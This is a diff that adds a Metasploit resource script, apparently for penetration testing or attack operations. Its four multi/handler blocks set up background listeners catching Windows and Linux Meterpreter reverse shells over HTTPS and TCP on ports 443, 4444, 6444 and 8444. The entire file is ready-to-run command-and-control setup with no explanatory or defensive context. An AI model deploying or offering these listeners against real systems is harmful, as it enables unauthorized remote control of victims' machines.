@@ -1,0 +1,31 @@
+# Windows Meterpreter Reverse HTTPS
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set EXITOnSession false
+exploit -j -z
+
+# Windows Meterpreter Reverse TCP
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+
+# Linux x86 Meterpreter Reverse TCP
+use exploit/multi/handler
+set payload linux/x86/meterpreter_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 6444
+set ExitOnSession false
+exploit -j -z
+
+# Linux x64 Meterpreter Reverse TCP
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8444
+set ExitOnSession false
+exploit -j -z
